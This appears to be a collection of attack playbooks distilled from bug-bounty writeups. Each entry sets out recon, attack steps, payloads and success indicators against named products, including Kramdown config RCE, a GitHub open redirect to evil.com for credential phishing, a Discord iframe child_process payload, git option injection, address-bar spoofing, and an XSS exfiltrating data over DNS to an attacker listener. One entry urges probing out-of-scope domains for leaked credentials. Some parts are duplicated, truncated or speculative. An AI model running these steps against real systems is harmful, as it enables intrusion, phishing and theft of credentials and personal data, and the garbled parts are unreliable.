success_indicators: Execution of commands on the DataPower appliance's Linux host (e.g., reading sensitive files, establishing a reverse shell).
Successful interaction with internal services that should not be publicly accessible.
Receiving a callback from the DataPower appliance to an attacker-controlled server if RCE is used to establish outbound communication.
failure_indicators: 'Send a Test Message' function not available or returns errors indicating invalid input or service unavailability.
Redis service not accessible or responding as expected.
RCE vulnerability in Redis not present or patched.
WAF or other security controls blocking the crafted requests or Redis commands.

playbooks.impact: Execution of arbitrary code on the underlying Linux operating system of the IBM DataPower appliance, allowing for extraction of private keys, establishing a network backdoor, or further lateral movement within the network. Code execution can be as the 'drouter' user (Docker) or 'root' (virtual/physical editions).
playbooks.key_lesson: Always test internal network services reachable via authenticated web interfaces, especially those designed for debugging or testing connectivity, as they can be abused for SSRF and lead to further vulnerabilities like RCE.

meta.title: GitHub Pages - Multiple RCEs via insecure Kramdown configuration

trigger_conditions.when_to_apply: When a user can control the markdown content or configuration for a GitHub Pages site, and the underlying Kramdown version is vulnerable.
prerequisites: User must be able to create or modify content in a GitHub Pages repository.
GitHub Pages must be using a vulnerable version of the Kramdown gem (prior to 2.3.0 for template option, or versions affected by the :input option vulnerability).
applicability_signals: Site builds using Kramdown.
Vulnerable Kramdown version detected (e.g., via version checking or specific error messages).
Kramdown's `template` or `:input` options are exposed to user input.
skip_if: GitHub Pages is using a patched version of Kramdown.
WAF blocks attempts to use specific characters or keywords required for exploitation.
The target environment sanitizes or restricts file path manipulation.

recon_steps: Step 1: Identify if the target uses GitHub Pages and Jekyll for site generation.
Step 2: Determine the version of the Kramdown gem being used by examining site build logs or metadata if possible. If not, assume a vulnerable version might be in use if other indicators are present.
Step 3: Analyze the Kramdown configuration options available in the specific version, focusing on `template` and `:input` options.
attack_steps: Step 1: Create a new Jekyll site locally or within a GitHub Pages repository.

Step 2: Modify the `_config.yaml` file to include a vulnerable Kramdown option. For example, to test RCE via `template` option: `kramdown: template: string://<%= %x|date| %>'`. For RCE via `:input` option, a file needs to be placed at a known location first.
Step 3: Upload the malicious configuration and trigger a site build.

Step 4 (for :input option): Create a file with malicious Ruby code (e.g., `evil.rb` with `system('echo RCE_TEST > /tmp/rce_check')`) and upload it to a predictable location within the build environment (e.g., `/tmp/` or a temporary build directory). This might require observing build directories during a test build.

Step 5 (for :input option): In `_config.yaml`, set `kramdown: input: ../../../../../../../../../../../../../../../tmp/evil.rb` (adjusting path traversal based on observed build directories) to make Kramdown attempt to load the malicious file as a parser.
Step 6: Monitor the build output and server-side for evidence of code execution or file creation.
payloads_or_patterns:
Template option RCE: `markdown: kramdown
kramdown:
  template: string://<%= %x|id| %>`
Input option RCE payload file: `system("echo RCE_SUCCESS > /tmp/rce_executed")`

Input option config: `kramdown:
  input: <path_traversal_sequence>/evil.rb` (where `<path_traversal_sequence>` leads to the uploaded payload file, e.g. `../../../../../../../../../../../../../../tmp/`)
tools_recommended: Jekyll CLI: For local testing and building Jekyll sites.
Perf-tools (opensnoop): To observe file paths accessed during Jekyll builds on a server.
Burp Suite: To proxy and inspect HTTP requests/responses, and potentially identify build artifacts.
success_indicators: Website displays the output of the embedded Ruby code (e.g., current date, user ID).
A specific file is created on the server (e.g., `/tmp/rce_check` or `/tmp/rce_executed`).
Build fails with an error indicating the Ruby code was executed but not parsed as expected.
Server-side callback to an attacker-controlled server.
failure_indicators: Build succeeds without any indication of code execution (e.g., no output from embedded Ruby, no file creation).
Build fails with a generic error unrelated to code execution.
A 403 Forbidden or similar error if the WAF blocks payload characters.
The `kramdown:input` option results in a `wrong constant name` error without the intended file being loaded or executed.

playbooks.impact: Arbitrary Ruby code execution on the GitHub Pages build servers, allowing attackers to potentially read sensitive files, execute commands, exfiltrate data, or gain further access to the build environment.
playbooks.key_lesson: Always validate and sanitize user-controlled input for configuration options, especially those that can be interpreted as code or file paths, and be aware of vulnerable library versions in managed platforms.

meta.title: Back to 2019: Disclosure Employers PII and Credentials

trigger_conditions.when_to_apply: When a domain is found through WHOIS recon that is not explicitly 'in scope' but may be related to the target company, and that domain's subdomains exhibit directory indexing.
prerequisites: The target company has domains registered that are not explicitly listed as 'in scope' for bug bounty hunting.
WHOIS information for the target company can be queried to find related domains.
applicability_signals: Discovery of a related domain via WHOIS lookup.
A subdomain of the related domain responds with directory indexing enabled on a path like /webmaster/uploaded/.
skip_if: No related domains found via WHOIS.
Subdomains do not exhibit directory indexing.
Directory indexing is password protected or sanitized.

recon_steps: Step 1: Use WHOIS lookup for the target company (e.g., 'Registrant Organization: PayPal Inc.') to identify potentially related domains that may not be explicitly in scope.
Step 2: For identified related domains, perform subdomain enumeration. If subdomains are found, check for directory indexing vulnerabilities.
Step 3: Specifically, check for common administrative paths like '/webmaster/' and subdirectories like '/uploaded/' for directory indexing.
attack_steps: Step 1: Access the discovered directory indexing path (e.g., bop.exampleasia.com/webmaster/uploaded/) using a web browser or HTTP client.
Step 2: Browse the contents of the directory for sensitive files, particularly PDF documents.

Step 3: Analyze the content of any found PDF files for leaked credentials (usernames, passwords) and Personally Identifiable Information (PII) such as employer names, personal phone numbers, and addresses.
tools_recommended: `whois` command-line tool for domain information.
Subdomain enumeration tools (e.g., Amass, Subfinder).
Directory brute-forcing tools (e.g., Dirb, Feroxbuster) with common directory wordlists.
Web browser or HTTP client (e.g., `curl`) for accessing and downloading files.
success_indicators: Access to a directory listing page containing sensitive files (e.g., PDF documents).
PDF documents containing employer PII (full name, personal telephone number, address).
PDF documents containing usernames and passwords for other company assets.
failure_indicators: Directory is password protected or returns 403 Forbidden.
Directory is empty or contains non-sensitive files.
No PDF files are found within the directory.

playbooks.impact: Disclosure of Personally Identifiable Information (PII) of employers, including names, contact details, and residential addresses. Disclosure of credentials (usernames and passwords) for other company assets, potentially leading to further account compromise.
playbooks.key_lesson: Leverage WHOIS information to discover potentially related but out-of-scope domains and aggressively test them for directory indexing vulnerabilities, as these can expose sensitive internal data and credentials.

meta.title: Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers

target_profile.technology: Mobile Browsers (Safari, Yandex Browser, Opera Touch)

trigger_conditions.when_to_apply: When the target browser exhibits specific URL handling behaviors, particularly regarding port numbers in URLs and how it displays them to the user, or how it handles multiple window.open() calls.
prerequisites: Attacker can control the content of a web page loaded in the target browser.
The target browser does not consistently display port numbers in the address bar.
applicability_signals: Browser's address bar does not reveal the port number by default.
Browser exhibits unexpected behavior with `window.open()` and `window.stop()`.
skip_if: Browser consistently displays port numbers in the address bar.
Browser immediately updates the address bar to the final URL in rapid redirects.

recon_steps: Step 1: Browse to a known secure website (e.g., google.com) and observe how the address bar displays the URL, paying attention to whether port numbers are shown.
Step 2: Test the behavior of `window.open()` with different URLs and `window.stop()` to understand how the browser handles rapid window manipulations.
attack_steps: Step 1: Craft an HTML page with JavaScript that includes a `setInterval` function to repeatedly redirect the `location.href` to a target domain on a non-standard port (e.g., `https://bing.com:8080`).

Step 2: Observe if the address bar remains on the spoofed URL or if it updates to the actual URL. For Yandex/Opera, use a combination of `window.open()` to a spoofed URL, then `window.open()` to a legitimate URL, and immediately call `win.window.stop()` on the spoofed window, followed by `win.document.write()` to display deceptive content.
Step 3: Social engineer the user to interact with the deceptive content or to stay on the page for a prolonged period, exploiting the address bar confusion.
payloads_or_patterns: :\",\"WIN\"); window.open(\"https://\", \"WIN\"); win.window.stop(); win.document.write('This is not ')">
tools_recommended: Burp Suite (for hosting the malicious HTML page)
Custom HTML/JavaScript testing
success_indicators: The browser's address bar displays a URL that does not match the actual content being rendered or the intended domain.
The user is unable to discern the true URL due to the address bar remaining on a deceptive address.
failure_indicators: The address bar immediately updates to the correct URL after the spoofing attempt.
The port number is consistently displayed in the address bar, negating the spoofing technique.

playbooks.impact: User is tricked into believing they are on a legitimate website, leading to credential theft, malware installation, or financial fraud through phishing attacks.
playbooks.key_lesson: Always scrutinize the full URL in the address bar, including port numbers, especially on mobile browsers, and be wary of rapid redirects or confusing window behaviors.

meta.title: Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers

target_profile.technology: Mobile Browsers (Safari, Yandex Browser, Opera Touch)

trigger_conditions.when_to_apply: When a mobile browser allows arbitrary port numbers in URLs without explicitly displaying them, and it preserves the address bar content during rapid redirects or window operations.
prerequisites: Target application uses a mobile browser.
applicability_signals: Browser's default behavior of not displaying port numbers in the address bar.
Browser's tendency to preserve the address bar content during rapid window operations or redirects.
skip_if: Browser explicitly shows port numbers in the address bar.
Browser immediately updates the address bar to reflect the actual destination URL during redirects or window operations.

recon_steps: Step 1: Identify the target mobile browser and its version.
Step 2: Check browser documentation or perform manual testing to determine if port numbers are displayed by default in the address bar.
attack_steps: Step 1: Craft an HTML payload that uses `location.href` to redirect to a legitimate-looking domain on a non-standard port (e.g., `https://trusted-site.com:8080`).

Step 2: Use `setInterval` to rapidly reload the page or redirect to a different URL on a different port (e.g., `setInterval(function(){location.href='https://trusted-site.com:8081'}, 2000);`) to disorient the user and prevent the address bar from updating correctly.

Step 3 (for Yandex/Opera): Use `window.open` to open a malicious URL on a non-standard port, then immediately open the legitimate URL in the same window, and use `win.window.stop()` to prevent the address bar from updating to the legitimate URL.
payloads_or_patterns: <p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="win = window.open(\'https://www.facebook.com:8080\',\'WIN\'); window.open(\'https://www.bing.com\', \'WIN\'); win.window.stop(); win.document.write('This is not Facebook')">
tools_recommended: Burp Suite (for intercepting and modifying HTTP requests)
Custom HTML/JavaScript for crafting payloads
success_indicators: The user sees the address bar displaying a spoofed URL (e.g., `trusted-site.com:8080`) while the actual content served is from a different or malicious source.
The user is tricked into believing they are on a legitimate website due to the deceptive address bar.
failure_indicators: The address bar immediately updates to reflect the actual URL being loaded.
The port number is always displayed in the address bar, making spoofing obvious.

playbooks.impact: Users are tricked into believing they are on a legitimate website, leading to credential theft, malware installation, or financial fraud through phishing attacks.
playbooks.key_lesson: Always verify the displayed URL in the address bar when interacting with sensitive applications, especially on mobile. Be cautious of unexpected port numbers or rapid redirects.

meta.title: GitHub Gist - Account takeover via open redirect

target_profile.technology: GitHub Gist (likely Ruby on Rails application)
affected_components: URL generation using `url_for` and `check_source` controller action

trigger_conditions.when_to_apply: When an authenticated user is redirected by a GitHub application that uses `url_for` with controllable parameters, specifically the `script_name` parameter, and the application does not properly sanitize these parameters before inclusion in the redirect URL.
prerequisites: Attacker must have an authenticated GitHub account.
applicability_signals: Presence of a redirect mechanism that uses `url_for` with a `source` parameter.
The `check_source_redirect_url` method is observed parsing query parameters.
The `script_name` parameter is not explicitly filtered or sanitized.
skip_if: The application explicitly filters out or sanitizes the `script_name` parameter in redirect URLs.
The `url_for` method has been updated to prevent unsafe `script_name` usage.
CSP policies strictly prevent `javascript:` URIs or redirects to untrusted domains.

recon_steps: Step 1: Analyze GitHub application's URL generation logic, specifically looking for uses of `url_for` and its available options like `:script_name`, `:host`, `:protocol`.
Step 2: Identify any controller actions that perform redirects based on user-supplied parameters, especially those that might indirectly control `url_for` arguments.
attack_steps: Step 1: Craft a URL that targets a GitHub redirect endpoint, including a `source` parameter (e.g., `source=message`).
Step 2: Append a malicious `script_name` parameter to the crafted URL. The `script_name` should be a domain controlled by the attacker, prepended with a dot (e.g., `.attacker-controlled.com`).
Step 3: Trigger the redirect by clicking the crafted link or submitting a form that leads to this endpoint while authenticated.
Step 4: Observe the `Location` header in the HTTP response. If the redirect is successful, it will point to the attacker's domain, potentially with additional path components.

Step 5: To achieve account takeover, leverage this open redirect to host a phishing page on the attacker-controlled domain that mimics GitHub's login page, tricking the user into entering their credentials.
payloads_or_patterns: Example redirect: `http://github.com/some/path?source=message&script_name=.evil.com` will redirect to `http://github.com.evil.com/welcome/index` (or similar path).
tools_recommended: Burp Suite: To intercept and modify HTTP requests, observe redirect `Location` headers, and set up a listener on the attacker-controlled domain.
A custom phishing server: To host a convincing login page.
success_indicators: The HTTP response contains a 302 Found status code.
The `Location` header in the response points to a domain controlled by the attacker, with the format `http://<GH_HOST><script_name><path>` (e.g., `http://github.com.evil.com/welcome/index`).
User navigates to the attacker-controlled domain after clicking the malicious link.
failure_indicators: The `Location` header still points to a legitimate GitHub domain or a different unexpected domain.
A 400 Bad Request or similar error is returned, indicating parameter validation failure.
A WAF blocks the request due to suspicious parameters.
Suggestion for failure: If `script_name` is sanitized, explore other `url_for` parameters like `:host` or `:params` for potential injection points.

playbooks.impact: Attacker can achieve account takeover by hosting a phishing page on their domain, leveraging the open redirect to trick users into submitting their GitHub credentials.
playbooks.key_lesson: Always sanitize and validate all user-controllable parameters used in URL generation functions, especially when they influence the host, protocol, or script name of redirect URLs.

meta.title: RCE via git option injection (almost)

tech_stack_fingerprints: HTML source revealing Ruby on Rails patterns

trigger_conditions.when_to_apply: When the target allows reverting between wiki commits and the commit references are user-controllable without proper sanitization.
prerequisites: Attacker must have an authenticated session on GitHub.
The target application must be vulnerable to Git command option injection through branch names.
A mechanism to bypass CSRF protection for the revert action must exist or be discoverable.
applicability_signals: The presence of a wiki revert functionality allowing two commit references as URL parameters.
User-controlled input being directly passed to a `git diff-tree` command without strict validation.
skip_if: All API responses indicate CSRF token validation failure for malicious branch names.
User-supplied commit references are strictly validated as valid SHA hashes and do not allow special characters like '-'.

recon_steps: Step 1: Analyze application code for points where 'git' commands are executed with user-controlled input.
Step 2: Identify functions that call `git diff-tree` with commit references derived from URL parameters, such as the `reverse_diff` method called by `revert_range` for wiki commits.
Step 3: Observe that the commit references in the revert endpoint are only checked for validity as git references, not sanitized for special characters.
attack_steps: Step 1: Push a malicious branch name starting with a hyphen (e.g., `--help`) to the target repository: `git push origin master:--help`.
Step 2: Attempt to revert between `HEAD` and the malicious branch name via a POST request to the wiki revert endpoint: `POST /user/repo/wiki/Home/_revert/HEAD/--help`.
Step 3: If a CSRF error occurs, investigate bypassing CSRF protection. The writeup mentions attempting to use the global CSRF token, which was not easily discoverable in this specific GHE version.

Step 4: (Hypothetical, as the writeup was cut short) If CSRF is bypassed, craft a Git command injection payload within the branch name to achieve RCE. For example, a branch name like `--exec=id` or similar.
payloads_or_patterns: --help (as branch name leading to command injection)
tools_recommended: Git CLI: For pushing malicious branches.
Burp Suite or OWASP ZAP: For intercepting and modifying HTTP requests, especially for CSRF token manipulation and payload injection.
success_indicators: Successful execution of the injected command (e.g., receiving output from `id` command in the response or via a callback).
Unexpected responses or errors that indicate the Git command was interpreted with injected options.
failure_indicators: 422 Unprocessable Entity response with CSRF token validation errors: Indicates CSRF protection is active and needs to be bypassed. Pivot to finding global CSRF tokens or other bypasses.

400 Bad Request or similar errors indicating invalid commit references: Suggests deeper validation than just git reference validity. May require finding valid commit SHAs for the first parameter and a malicious branch for the second.

playbooks.impact: Remote Code Execution on the GitHub Enterprise server, allowing an attacker to read sensitive files, execute arbitrary commands, and potentially take full control of the server.
playbooks.key_lesson: Always sanitize user-controlled input when passing it as arguments to system commands, especially for applications interacting with external tools like Git. Pay close attention to options and flags that can be injected, and ensure robust CSRF protection is in place for state-changing operations.

meta.title: Discord Desktop app RCE

trigger_conditions.when_to_apply: When the Electron app's `contextIsolation` is disabled, allowing JavaScript execution in the renderer process to affect Electron's internal JavaScript code and preload scripts.
prerequisites: Discord Desktop Application installed and running.
applicability_signals: Extraction of the application's asar archive reveals `contextIsolation: false` in `BrowserWindow` options.
The application utilizes iframes or other embedded web content where JavaScript can be executed.
skip_if: The Discord Desktop Application has `contextIsolation` enabled.
No observable way to inject JavaScript into the renderer process.

recon_steps: Step 1: Download and extract the Discord desktop application's `app.asar` file to inspect `mainScreenPreload.js` and `BrowserWindow` options for `contextIsolation` and `nodeIntegration` settings.
Step 2: Identify specific functionalities within the application that allow for the rendering of external or user-provided HTML content, such as message embeds or iframes.
attack_steps: Step 1: Inject JavaScript into an iframe embed within a Discord message. This script should aim to override critical JavaScript built-in methods like `Array.prototype.join`.
Step 2: Trigger a function within the Electron application that internally uses the overridden method (e.g., a function that internally calls `Array.prototype.join`).
Step 3: Leverage the altered execution flow to gain access to Node.js features through the preload script or Electron's internal context, ultimately leading to arbitrary code execution.
payloads_or_patterns: Example of overriding `Array.prototype.join` in an iframe's JavaScript: `<iframe srcdoc='<script>Array.prototype.join = function() { require("child_process").exec("calc"); };</script>'></iframe>` (Note: This is a simplified concept; actual RCE would require precise interaction with Electron's internal calls).
tools_recommended: asar tool: For extracting and re-packaging Electron application archives.
Developer Tools: For inspecting iframe content and JavaScript execution within the Electron app (if accessible).
success_indicators: Execution of arbitrary code, such as opening the Windows Calculator application (`calc.exe`).
Observed network connections originating from the Discord process to attacker-controlled servers (if payload is network-based).
failure_indicators: No code execution occurs when the expected interaction is performed. This might indicate that the override is not effective or the target function doesn't use the overridden method.

Application crashes or exhibits unexpected behavior without RCE, suggesting a potential misstep in the exploitation chain. Pivot to researching other built-in JavaScript methods or different injection vectors.

playbooks.impact: Remote Code Execution on the victim's machine, allowing an attacker to run arbitrary commands with the privileges of the Discord application.
playbooks.key_lesson: Always verify `contextIsolation` and `nodeIntegration` settings in Electron applications, as disabling `contextIsolation` can lead to RCE by allowing renderer JavaScript to influence Electron's internal context.

meta.title: MS Enterprise app management service RCE. CVE-2022-35841

trigger_conditions.when_to_apply: When the Enterprise App Management Service is deployed and configured with exploitable DCOM launch and activation permissions, allowing unprivileged local or remote interaction.
prerequisites: Target environment utilizes Microsoft Enterprise App Management Service.
Vulnerability CVE-2022-35841 is present and not patched.
applicability_signals: The Enterprise App Management Service is identified as being in use.
Analysis of DCOM interface permissions reveals broad access rights for unprivileged users.
skip_if: The Enterprise App Management Service is not deployed or is correctly patched.
DCOM interface permissions are restricted and do not allow unprivileged access.

recon_steps: Step 1: Identify if the Microsoft Enterprise App Management Service is deployed within the target environment.
Step 2: Enumerate registered AppIds in the registry and identify those marked as LocalService.
Step 3: Analyze the launch and activation permissions for identified COM objects, specifically looking for those that permit unprivileged local or remote interaction.
attack_steps: Step 1: Craft a malicious payload to be executed via the vulnerable DCOM interface of the Enterprise App Management Service.
Step 2: Exploit the DCOM interface to execute the payload on the target system, leveraging the discovered RCE vulnerability.
Step 3: Escalate privileges to SYSTEM level if necessary, depending on the initial execution context.
tools_recommended: Custom C# application for enumerating AppIds and analyzing DCOM permissions.
Tools for crafting and delivering DCOM-based exploits (specific tools not detailed in writeup).
success_indicators: Remote command execution confirmed on the target host.
Privilege escalation to SYSTEM level achieved.
failure_indicators: Access denied or insufficient privileges errors when attempting to interact with the DCOM interface. Pivot to investigating other COM objects with potentially weaker permissions.
Payload execution fails to yield expected results. Verify payload integrity and DCOM interface interaction.

playbooks.impact: An unprivileged user can achieve Remote Command Execution and Local Privilege Escalation to SYSTEM level on vulnerable hosts.
playbooks.key_lesson: When investigating DCOM interfaces, pay close attention to applications hosted as LocalServices and analyze their launch and activation permissions for exploitable configurations that allow unprivileged local or remote interaction.

meta.title: I had fun with this XSS

affected_components: Endpoint reflecting user input within a JavaScript `window.location` assignment
tech_stack_fingerprints: HTML contains '<script type="text/javascript"> window.onload = function () { window.location = 'https://url/reflected-point'

trigger_conditions.when_to_apply: This technique is applicable when a web application reflects user-controlled input into a JavaScript `window.location` assignment, and severely restricts the characters that can be used, but still allows certain special characters like ',', '.', '=', ':', '@', '#', '?', '*', '%'.
prerequisites: The target endpoint reflects user input within a JavaScript `window.location` assignment.
The target filters out most special characters but allows ',', '.', '=', ':', '@', '#', '?', '*', '%'.
applicability_signals: The presence of the JavaScript code snippet: `window.location = 'https://url/reflected-point'`.
Fuzzing reveals that only ',', '.', '=', ':', '@', '#', '?', '*', '%' are reflected.
Attempts to use standard XSS payloads like `' -alert(0)- '` fail due to character filtering.
skip_if: No reflection of user input within `window.location`.
All special characters are filtered.
Parentheses are allowed and reflected.

recon_steps: Step 1: Identify an endpoint that reflects user input into JavaScript.
Step 2: Fuzz input parameters to identify allowed and reflected special characters. Specifically note the allowed set: ',', '.', '=', ':', '@', '#', '?', '*', '%'.
attack_steps: Step 1: Craft a payload targeting the `window.location` assignment. Use allowed special characters to manipulate the URL.

Step 2: Attempt to bypass character restrictions by using the allowed characters to construct a valid JavaScript execution path. Start with a basic payload like `',document.location='javascript:document.domain'`.
Step 3: If `javascript:` scheme is blocked, try redirecting to an `http:` URL, even without `//`. Payload: `',window.location='http:my-url/'`.
Step 4: To exfiltrate data, use DNS-based exfiltration by parsing data as a subdomain. Payload: `',window.location='http:'%2bdocument.domain%2b'.my-burp-domain'`.
tools_recommended: Burp Suite: Repeater for manual testing and observing reflected input, Intruder for fuzzing allowed characters.
success_indicators: The target page redirects to a custom URL constructed using allowed characters.
A DNS request is observed at a listener (e.g., Burp Collaborator) with the document's domain as a subdomain, confirming exfiltration.
failure_indicators: A 500 Internal Server Error is returned, indicating a blocking mechanism for certain JavaScript patterns like `javascript:`.
The redirection fails or does not execute as expected, suggesting incomplete bypass of filters.

playbooks.impact: Allows an attacker to execute arbitrary JavaScript in the context of the victim's browser, potentially leading to session hijacking, data exfiltration, or further exploitation through browser vulnerabilities.
playbooks.key_lesson: When encountering strict character filtering in JavaScript reflection points, explore alternative syntax and data exfiltration methods like DNS-based subdomain parsing to bypass limitations.
